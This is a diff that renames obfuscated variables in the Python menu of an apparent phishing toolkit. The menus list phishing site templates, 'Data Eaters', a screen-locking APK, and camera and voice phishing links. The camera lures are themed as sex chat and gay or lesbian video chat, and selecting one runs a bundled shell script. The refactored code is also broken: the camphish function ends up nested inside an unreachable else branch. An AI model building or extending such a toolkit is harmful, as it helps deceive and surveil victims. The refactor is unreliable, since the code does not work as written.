@@ -5,23 +5,44 @@ from files.startup import *
 from files.template import *
 from files.deater import *
 import os
-
 def lang():
-    O0OO00O0O0000OO0O = '\x1b[1;37mLanguage' + red + '\n1-EN' + green + '\n2-DE\n'
-    slow(O0OO00O0O0000OO0O, 0.025)
-    OOOOOO0000O00000O = str(input(blue + 'Choose>'))
-    if str(OOOOOO0000O00000O) == '1':
+    menu_text = (
+        '\x1b[1;37mLanguage' + red +
+        '\n1-EN' + green +
+        '\n2-DE\n'
+    )
+    slow(menu_text, 0.025)
+    choice = input(blue + 'Choose>')
+    if choice == '1':
         slow('....Ok Man....', 0.01)
         os.system('clear')
-        OO00O00O00O0OOO00 = '\x1b[1;93m[1]\x1b[1;91m Phishing Websites (Templates)\n\x1b[1;93m[2]\x1b[1;91m Data Eaters\n\x1b[1;93m[3]\x1b[1;91m BadLock (apk)\n\x1b[1;93m[4]\x1b[1;91m Camera Phishing(link)\n\x1b[1;93m[5]\x1b[1;91m Voice Phishing (link)\n\x1b[1;93m[6]\x1b[1;91m Other\n\x1b[1;93m[7]\x1b[1;91m Custom \n\x1b[1;93m[0]\x1b\x1b[1;91m Exit\n'
+        options = (
+            '\x1b[1;93m[1]\x1b[1;91m Phishing Websites (Templates)\n'
+            '\x1b[1;93m[2]\x1b[1;91m Data Eaters\n'
+            '\x1b[1;93m[3]\x1b[1;91m BadLock (apk)\n'
+            '\x1b[1;93m[4]\x1b[1;91m Camera Phishing(link)\n'
+            '\x1b[1;93m[5]\x1b[1;91m Voice Phishing (link)\n'
+            '\x1b[1;93m[6]\x1b[1;91m Other\n'
+            '\x1b[1;93m[7]\x1b[1;91m Custom \n'
+            '\x1b[1;93m[0]\x1b\x1b[1;91m Exit\n'
+        )
         slogo()
-        slow(OO00O00O00O0OOO00, 0.01)
-    elif str(OOOOOO0000O00000O) == '2':
+        slow(options, 0.01)
+    elif choice == '2':
         slow('Moin Moin Moin', 0.01)
         os.system('clear')
-        OO00O00O00O0OOO00 = '\x1b[1;93m[1]\x1b[1;91m Phishing-Betrug (Templates)\n\x1b[1;93m[2]\x1b[1;91m Datenfresser\n\x1b[1;93m[3]\x1b[1;91m Bildshcirmschloss (apk)\n\x1b[1;93m[4]\x1b[1;91m Camera Phishing(link)\n\x1b[1;93m[5]\x1b[1;91m Voice Phishing (link)\n\x1b[1;93m[6]\x1b[1;91m Andere\n\x1b[1;93m[7]\x1b[1;91m Benutzerdefiniert \n\x1b[1;93m[0]\x1b\x1b[1;91m Verlassen\n'
+        options = (
+            '\x1b[1;93m[1]\x1b[1;91m Phishing-Betrug (Templates)\n'
+            '\x1b[1;93m[2]\x1b[1;91m Datenfresser\n'
+            '\x1b[1;93m[3]\x1b[1;91m Bildshcirmschloss (apk)\n'
+            '\x1b[1;93m[4]\x1b[1;91m Camera Phishing(link)\n'
+            '\x1b[1;93m[5]\x1b[1;91m Voice Phishing (link)\n'
+            '\x1b[1;93m[6]\x1b[1;91m Andere\n'
+            '\x1b[1;93m[7]\x1b[1;91m Benutzerdefiniert \n'
+            '\x1b[1;93m[0]\x1b\x1b[1;91m Verlassen\n'
+        )
         slogo()
-        slow(OO00O00O00O0OOO00, 0.01)
+        slow(options, 0.01)
     else:
         print('Wrong input!')
         lang()
@@ -47,62 +68,57 @@ def sites():
     print('\x1b[1;92m[\x1b[0m\x1b[1;77m00\x1b[0m\x1b[1;92m]\x1b[0m\x1b[1;91m Back\x1b[0m ')
     csite()
 
+def main_menu():
+        option = input(f"{red}Option {yellow}>{green} ")
+        if option == '1':
+            sites()
+        elif option == '2':
+            os.system('clear')
+            slogo()
+            deater()
+        elif option == '3':
+            os.system('clear')
+            slogo()
+            block()
+        elif option == '4':
+            os.system('clear')
+            slogo()
+            camphish()
+        elif option == '5':
+            soon()
+        elif option == '6':
+            soon()
+        elif option == '7':
+            soon()
+        elif option == '8':
+            soon()
+        elif option == '0':
+            lang()
+        else:
+            print('wrong input!')
+            main_menu()
+            def camphish():
+                menu_prefix = red + '[' + green + '0' + red + ']'
+                menu_options = [
+                    'SexChat',
+                    'Learn English',
+                    'Gay Video Chat',
+                    'Lesbian Video Chat',
+                    'Make me Old',
+                    'X-Ray',
+                    'Online make-up',
+                    'exit'
+                ]
+                for idx, option in enumerate(menu_options, start=1):
+                    slow(f'\n\r{menu_prefix.replace("0", str(idx))}{yellow} {option}', 0.005)
 
-def mm():
-    OO0OO00O0O0OO0OO0 = input(red + 'Option ' + yellow + '>' + green)
-    if OO0OO00O0O0OO0OO0 == '1':
-        sites()
-    elif OO0OO00O0O0OO0OO0 == '2':
-        os.system('clear')
-        slogo()
-        deater()
-    elif OO0OO00O0O0OO0OO0 == '3':
-        os.system('clear')
-        slogo()
-        block()
-    elif OO0OO00O0O0OO0OO0 == '4':
-        os.system('clear')
-        slogo()
-        camphish()
-    elif OO0OO00O0O0OO0OO0 == '5':
-        soon()
-    elif OO0OO00O0O0OO0OO0 == '6':
-        soon()
-    elif OO0OO00O0O0OO0OO0 == '7':
-        soon()
-    elif OO0OO00O0O0OO0OO0 == '8':
-        soon()
-    elif OO0OO00O0O0OO0OO0 == '0':
-        lang()
-    else:
-        print('wrong input!')
-        mm()
-
-
-def camphish():
-    O00OO00O00000O0OO = red + '[' + green + '0' + red + ']'
-    OO0O00OOO0O0OOOO0 = [
-        'SexChat',
-        'Learn English',
-        'Gay Video Chat',
-        'Lesbian Video Chat',
-        'Make me Old',
-        'X-Ray',
-        'Online make-up',
-        'exit']
-    OOO00OOOO000O0O00 = 0
-    while OOO00OOOO000O0O00 < len(OO0O00OOO0O0OOOO0):
-        slow('\n\r' + O00OO00O00000O0OO.replace('0', str(OOO00OOOO000O0O00 + 1)) + yellow + ' ' + OO0O00OOO0O0OOOO0[OOO00OOOO000O0O00], 0.005)
-        OOO00OOOO000O0O00 = OOO00OOOO000O0O00 + 1
-        continue
-    OO0O00000OO0OO000 = '/sdcard'
-    print('\n')
-    O000O0OOOOO0000OO = input(green + 'Choice ' + red + '>' + yellow)
-    if O000O0OOOOO0000OO == '1':
-        os.system('cd cp/1/;bash script.sh')
-    elif O000O0OOOOO0000OO == '2' and O000O0OOOOO0000OO == '3' and O000O0OOOOO0000OO == '4' and O000O0OOOOO0000OO == '5' and O000O0OOOOO0000OO == '6' or O000O0OOOOO0000OO == '7':
-        soon()
-    else:
-        os.system('clear')
-        camphish()
+                print('\n')
+                choice = input(green + 'Choice ' + red + '>' + yellow)
+                if choice == '1':
+                    os.system('cd cp/1/;bash script.sh')
+                elif choice in ['2', '3', '4', '5', '6', '7']:
+                    soon()
+                else:
+                    os.system('clear')
+                    camphish()
 
